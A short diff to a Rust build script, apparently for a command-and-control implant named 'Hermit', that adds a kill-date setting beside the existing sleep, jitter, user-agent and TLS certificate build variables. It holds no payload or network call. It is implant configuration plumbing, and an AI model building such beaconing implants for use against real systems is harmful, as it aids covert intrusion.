@@ -21,6 +21,7 @@ fn main() {
     let sleep = env::var_os("HERMIT_SLEEP").unwrap();
     let jitter = env::var_os("HERMIT_JITTER").unwrap();
     let user_agent = env::var_os("HERMIT_USER_AGENT").unwrap();
+    let killdate = env::var_os("HERMIT_KILLDATE").unwrap();
     let https_root_cert = env::var_os("HERMIT_HTTPS_ROOT_CERT").unwrap();
     let https_client_cert = env::var_os("HERMIT_HTTPS_CLIENT_CERT").unwrap();
     let https_client_key = env::var_os("HERMIT_HTTPS_CLIENT_KEY").unwrap();
@@ -42,8 +43,9 @@ fn main() {
             &'static str,
             &'static str,
             &'static str,
+            &'static str,
         ) {}
-            (\"{}\", \"{}\", {}, {}, {}, \"{}\", \"{}\", \"{}\", \"{}\", \"{}\")
+            (\"{}\", \"{}\", {}, {}, {}, \"{}\", \"{}\", \"{}\", \"{}\", \"{}\", \"{}\")
         {}
         ",
         "{",
@@ -53,6 +55,7 @@ fn main() {
         sleep.into_string().unwrap(),
         jitter.into_string().unwrap(),
         user_agent.into_string().unwrap(),
+        killdate.into_string().unwrap(),
         https_root_cert.into_string().unwrap(),
         https_client_cert.into_string().unwrap(),
         https_client_key.into_string().unwrap(),
